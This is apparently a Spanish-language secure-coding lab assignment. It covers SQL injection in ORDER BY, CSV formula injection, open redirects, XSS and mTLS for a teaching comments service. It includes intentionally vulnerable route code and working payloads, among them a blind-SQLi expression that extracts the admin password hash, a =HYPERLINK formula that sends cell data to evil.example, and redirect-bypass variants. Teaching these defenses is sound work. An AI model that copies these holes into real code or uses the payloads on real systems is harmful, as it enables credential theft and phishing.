# Desafío

Dos etapas: la **etapa 1** agrega tres sinks nuevos al servicio; la **etapa 2** suma un front y un segundo microservicio comunicado con mTLS.

# Etapa 1: tres sinks nuevos

El equipo de producto pidió tres funcionalidades nuevas para el servicio de comentarios. Un desarrollador apurado ya las implementó y las tres son vulnerables.

Tu trabajo, para cada una:

1. **Agregar** el código vulnerable a `app/routes_vuln.py`.
2. **Explotarlo** y documentar el payload y el resultado.
3. **Implementar** la versión segura en `app/routes_secure.py`.
4. **Escribir los tests** en `tests/test_desafio.py`, con el mismo estilo de `tests/test_payloads.py`: el ataque funciona en `/vuln` y queda bloqueado o neutralizado en `/secure`.
5. **Responder** las preguntas de análisis.

Ninguna se resuelve copiando una solución existente del proyecto. Las tres usan conceptos del [marco teórico](docs/marco-teorico.html), pero en contextos que el servicio todavía no cubre.

---

## Reto 1: ordenar comentarios

> "Quiero ordenar los comentarios por autor o por id, ascendente o descendente."

### Código vulnerable

```python
@router.get("/comments/sorted")
def sorted_comments(sort: str = "id", direction: str = "asc"):
    # Inyección en ORDER BY: identificadores interpolados en la consulta.
    with get_conn() as conn:
        rows = conn.execute(f"SELECT id, author, body FROM comments ORDER BY {sort} {direction}").fetchall()
    return [dict(r) for r in rows]
```

### Pista para explotarlo

No hay `UNION` que valga después de un `ORDER BY`, pero el orden del resultado depende de una expresión que vos controlás. Probá con `sort` igual a:

```sql
(CASE WHEN (SELECT substr(password_hash, 1, 1) FROM users WHERE username = 'admin') = 'p' THEN id ELSE -id END)
```

Si el resultado sale ascendente, la condición es verdadera. Repitiendo con cada posición y cada carácter se puede extraer el hash completo (*blind SQL injection* basada en booleanos).

### Requisitos de la versión segura

- `sort` solo acepta `id` o `author`.
- `direction` solo acepta `asc` o `desc`, sin importar mayúsculas.
- Cualquier otro valor responde 422 o 400 sin ejecutar la consulta.
- El orden pedido se respeta.

<details>
<summary>Ayuda</summary>

Los parámetros `?` solo reemplazan **valores**, no identificadores ni palabras clave. Para identificadores se usa una allowlist: un `Literal["id", "author"]` en el tipo del parámetro o un diccionario que traduzca la opción del usuario al fragmento SQL. El texto que termina en la consulta tiene que salir de tu código, nunca de la entrada.

</details>

---

## Reto 2: exportar a CSV

> "Necesito descargar los comentarios para abrirlos en Excel."

### Código vulnerable

```python
@router.get("/comments/export.csv")
def export_csv():
    # CSV injection: los valores se escriben crudos en el archivo.
    with get_conn() as conn:
        rows = conn.execute("SELECT author, body FROM comments ORDER BY id").fetchall()
    lines = ["author,body"] + [f"{r['author']},{r['body']}" for r in rows]
    return PlainTextResponse("\n".join(lines), media_type="text/csv")
```

### Pista para explotarlo

Guardá un comentario desde `/vuln/comments` con este `body`:

```
=HYPERLINK("https://evil.example/?d="&A1,"Ver detalle")
```

Exportá el CSV y abrilo en una planilla de cálculo: la celda es una **fórmula**, no texto. Probá también un `body` con comas y saltos de línea y fijate qué pasa con las columnas.

### Requisitos de la versión segura

- Un valor que empieza con `=`, `+`, `-`, `@`, tab (`\t`) o retorno de carro (`\r`) se exporta como texto, no como fórmula.
- Las comas, comillas y saltos de línea dentro de un valor no rompen las filas ni las columnas.
- El texto normal se exporta sin cambios visibles.

<details>
<summary>Ayuda</summary>

Son **dos** problemas distintos con **dos** encoders distintos:

1. **Estructura del CSV:** el módulo `csv` de Python (`csv.writer` sobre un `io.StringIO`, con `quoting=csv.QUOTE_ALL`) se encarga de comillas, comas y saltos de línea.
2. **Fórmulas:** anteponer una comilla simple (`'`) a los valores que empiezan con un carácter peligroso. Es un encoder para el contexto "celda de planilla", y va en `app/encoding.py` junto a los demás.

Referencia: [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection), CWE-1236.

</details>

---

## Reto 3: volver después del login

> "Después de loguearse, el usuario tiene que volver a la página donde estaba."

### Código vulnerable

```python
from fastapi.responses import RedirectResponse

@router.get("/redirect")
def redirect_after_login(next: str = "/"):
    # Open redirect: redirige a cualquier destino.
    return RedirectResponse(next, status_code=302)
```

### Pista para explotarlo

Un atacante manda por mail un link legítimo de tu dominio que termina en un sitio de phishing:

```
http://localhost:8080/vuln/redirect?next=https://evil.example/login
```

Probá también estas variantes, que suelen pasar validaciones ingenuas como `next.startswith("/")`:

```
//evil.example
/\evil.example
/%2F%2Fevil.example
```

### Requisitos de la versión segura

- Solo se permiten paths **relativos del mismo sitio**, por ejemplo `/secure/comments` o `/secure/comments?filter=x`.
- Se rechazan URLs absolutas, `//host`, `/\host`, esquemas (`javascript:`, `data:`) y caracteres de control.
- Ante un destino inválido, se redirige a `/` (fallar cerrado) en lugar de devolver un error que rompa el flujo del usuario.

<details>
<summary>Ayuda</summary>

Validar con `startswith("/")` no alcanza: los navegadores interpretan `//evil.example` como una URL absoluta sin esquema, y muchos tratan `\` como `/`. Parseá con `urllib.parse.urlsplit` y exigí que `scheme` y `netloc` estén vacíos. Además rechazá cualquier `\` y exigí que empiece con `/` seguido de algo que no sea `/`. Mejor todavía: una allowlist de prefijos de rutas conocidas.

Referencia: [OWASP Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html), CWE-601.

</details>

---

## Tests mínimos esperados

Tu `tests/test_desafio.py` tiene que cubrir al menos estos casos (se pueden agregar más):

| Reto | En `/vuln` | En `/secure` |
|---|---|---|
| 1 | El payload `CASE WHEN` cambia el orden del resultado | `sort=CASE...` responde 422/400; `sort=author&direction=desc` ordena bien |
| 2 | El CSV contiene una línea con `=HYPERLINK(` al inicio de una celda | La celda empieza con `'=HYPERLINK(`; un `body` con comas no agrega columnas |
| 3 | `next=https://evil.example` redirige a `evil.example` | `https://evil.example`, `//evil.example` y `/\evil.example` redirigen a `/`; `/secure/comments` se respeta |

Para el reto 3, usá `client.get(..., follow_redirects=False)` y revisá el header `location` de la respuesta.

Correr todo:

```bash
cd comments-service
.venv/bin/pytest -q
```

---

## Entregas
### Diagrama de arquitectura
1. ARQUITECTURA.md con la arquictura. Podes elegir cambiar cualquier componentes, ej el nginx por otro que haga lo mismo. Justifica la elección.

### Preguntas de análisis
Respondé en un archivo `RESPUESTAS.md`, en pocas líneas cada una:

1. Para cada reto, ¿qué técnica principal aplicaste (validar, sanear, codificar, parametrizar, filtrar) y en qué capa de la arquitectura?
2. En el reto 1, ¿por qué no alcanza con "parametrizar todo"? ¿Qué otra parte de una consulta SQL tampoco se puede parametrizar?
3. En el reto 2, el dato puede venir de una fila guardada antes de que existiera tu fix. ¿Dónde conviene aplicar el encoder: al guardar o al exportar? ¿Por qué?
4. En el reto 3, ¿por qué es preferible redirigir a `/` en lugar de devolver 400?
5. ¿Alguno de los tres ataques lo hubiera frenado el gateway (`nginx.conf`) o un WAF con OWASP CRS? ¿Cuál no, y por qué?

---

## Bonus (opcional)

Si hacés alguno, agregá un `BONUS.md` en la raíz del proyecto que indique, para cada bonus resuelto, qué se pedía, qué hiciste y dónde se aplicó (archivos, funciones y tests).

- **Confianza cero entre servicios:** escribí una función `handle_comment_event(raw: bytes)` que reciba un evento JSON como si viniera de una cola, lo valide con un schema Pydantic estricto y lo rechace si tiene campos extra o tipos incorrectos. Agregá tests.
- **WAF real:** reemplazá la imagen del gateway por `owasp/modsecurity-crs:nginx`, repetí los payloads de `attacks/requests.http` y anotá cuáles bloquea el WAF y cuáles llegan igual al servicio.
- **ReDoS:** buscá qué es un *Regular expression Denial of Service* y revisá si alguna expresión regular del proyecto es vulnerable. Justificá la respuesta.

---

# Etapa 2: front y un segundo microservicio con mTLS

Se hace después de terminar la etapa 1. La arquitectura objetivo es:

```
navegador ──► gateway (nginx) ──► comments-service ──mTLS──► moderation-service
  /app/ (front)                      cliente TLS               exige certificado de cliente
```

La idea central de esta etapa: **mTLS autentica quién envía un mensaje, pero no valida qué contiene.** Un servicio con un certificado válido puede estar comprometido o tener un bug, y lo que manda sigue siendo entrada no confiable.

## Parte A: el front

### Material entregado

El front ya está hecho en `front/` (`index.html`, `app.js`, `styles.css`). El gateway lo sirve en `http://localhost:8080/app/` y consume la API `/secure`:

- `GET /secure/comments.json`: lista de comentarios. Devuelve los datos **crudos**, como cualquier API JSON.
- `POST /secure/comments`: crea un comentario.

El front funciona, pero **tiene al menos dos vulnerabilidades de XSS**.

### Tareas

1. **Encontrá y explotá** las vulnerabilidades del front. Para cada una, documentá el payload, cómo llega al navegador y de qué tipo de XSS se trata (almacenado, reflejado o basado en DOM).
   - Pista: un comentario guardado desde `/vuln/comments` no pasó ninguna validación.
   - Pista: no toda la entrada llega por la API. Mirá de dónde lee el front el filtro activo.
2. **Corregilas.** Los comentarios tienen que poder seguir mostrando `<b>`, `<i>` y links.
3. **Demostrá que la validación del formulario no es seguridad.** Mandá con `curl` un request que el formulario no permitiría y mostrá que el backend lo rechaza por su cuenta.
4. **Agregá una Content-Security-Policy** para `/app/` en el gateway, sin `unsafe-inline` ni `unsafe-eval`. El front tiene que seguir funcionando con la política activa.

<details>
<summary>Ayuda</summary>

- Para texto plano en el DOM: `textContent`. Para HTML que debe conservar formato: un sanitizer con allowlist (DOMPurify) antes de insertarlo. Nunca `innerHTML` con datos sin sanear.
- Ojo con `add_header` en nginx: si una `location` define uno propio, deja de heredar los del bloque `server`.
- Preguntate por qué la CSP sola no alcanza y por qué el fix en el código solo tampoco.

</details>

## Parte B: moderation-service con mTLS

### Funcionalidad

Cuando se crea un comentario, comments-service le pide un veredicto a un servicio nuevo, `moderation-service`. Por ejemplo, rechazar comentarios con palabras de una lista o con más de N links.

Contrato sugerido (podés ajustarlo, pero documentalo):

```
POST /moderate
request:  {"comment_id": 12, "author": "alice", "body": "texto"}
response: {"status": "approved" | "rejected", "reason": "texto corto"}
```

### Requisitos de mTLS

**No se entrega script para generar certificados.** Generá tu propia PKI y documentá en `CERTIFICADOS.md` los comandos usados y qué hace cada opción.

- Una **CA propia** del proyecto.
- Un certificado de **servidor** para `moderation-service`, con el nombre del servicio en el SAN y uso extendido `serverAuth`.
- Un certificado de **cliente** para `comments-service`, con uso extendido `clientAuth`.
- `moderation-service` **exige** certificado de cliente firmado por la CA del proyecto y rechaza la conexión en cualquier otro caso.
- `comments-service` **verifica** el certificado del servidor contra la CA del proyecto: nada de `verify=False`.
- Las **claves privadas no se suben al repositorio** (`.gitignore`). En el repo puede quedar el procedimiento, no las claves.
- `moderation-service` no se expone en el gateway: solo es accesible en la red interna de Docker.

### Requisitos de validación (el centro de la etapa)

- `moderation-service` valida el request con su propio **schema estricto** aunque la conexión sea mTLS: campos extra, tipos incorrectos o longitudes excesivas responden 422.
- `comments-service` **valida la respuesta** de moderation con un schema estricto. Un `status` desconocido o campos extra se tratan como respuesta inválida.
- **Fallar cerrado:** si moderation no responde, tarda demasiado o responde algo inválido, el comentario **no se publica**. Podés guardarlo como pendiente o rechazar el request; elegí y justificá.
- El `reason` que devuelve moderation es **dato no confiable**: si se muestra al usuario, se codifica.

<details>
<summary>Ayuda</summary>

- uvicorn acepta `--ssl-keyfile`, `--ssl-certfile`, `--ssl-ca-certs` y `--ssl-cert-reqs`. Buscá qué valor de `--ssl-cert-reqs` corresponde a "requerido".
- httpx acepta `verify=` (CA para validar al servidor) y `cert=` (certificado y clave del cliente).
- Para probar el rechazo, `curl` tiene `--cacert`, `--cert` y `--key`.

</details>

### Tests mínimos esperados (parte B)

| Caso | Resultado esperado |
|---|---|
| Conexión a moderation sin certificado de cliente | Falla el handshake TLS |
| Certificado de cliente firmado por **otra** CA | Falla el handshake TLS |
| comments-service con un servidor cuyo certificado no es de la CA | comments-service rechaza la conexión |
| Certificado válido + body con campos extra o tipos incorrectos | 422 en moderation |
| Moderation responde `{"status": "approved", "is_admin": true}` | comments-service lo rechaza y no publica |
| Moderation caído o con timeout | El comentario no se publica |

Los primeros tres se pueden probar con `curl` o con un script; los demás, con tests de pytest que simulen las respuestas de moderation (como hace `test_ssrf` con `net.http_get`).

## Entregas (etapa 2)
### Diagrama de arquitectura
1. Actualizá `ARQUITECTURA.md` con el front, `moderation-service` y la comunicación mTLS: dónde se valida, dónde se codifica y qué tramo está protegido por mTLS. Si cambiaste algún componente, justificá la elección.

### Preguntas de análisis
Respondé en `RESPUESTAS.md`, en una sección "Etapa 2", en pocas líneas cada una:

1. ¿Qué protege mTLS y qué no? Dá un ejemplo concreto de ataque que mTLS no frena.
2. Si ya hay mTLS entre los servicios, ¿por qué moderation valida el request y comments valida la respuesta?
3. El front valida con `pattern` y `maxlength`. ¿Para qué sirve esa validación si no es una medida de seguridad?
4. La API `comments.json` devuelve el HTML crudo. ¿Es un error del backend o del front? ¿Dónde tiene que estar el encoding o el saneamiento, y por qué?
5. ¿Qué pasa si se filtra la clave privada de `comments-service`? ¿Cómo se mitiga (rotación, vida útil corta, revocación)?

## Bonus (etapa 2)

Igual que en la etapa 1: si hacés alguno, documentalo en el mismo `BONUS.md` (qué se pedía, qué hiciste y dónde se aplicó: archivos, funciones y tests).

- **Autorización por identidad:** además de exigir un certificado de la CA, que moderation verifique que el cliente es específicamente `comments-service` (por CN o SAN). Pista: un nginx como sidecar delante de moderation puede validar el certificado y pasar el DN del cliente en un header.
- **Rotación:** certificados con vida útil corta y un procedimiento documentado para renovarlos sin cortar el servicio.
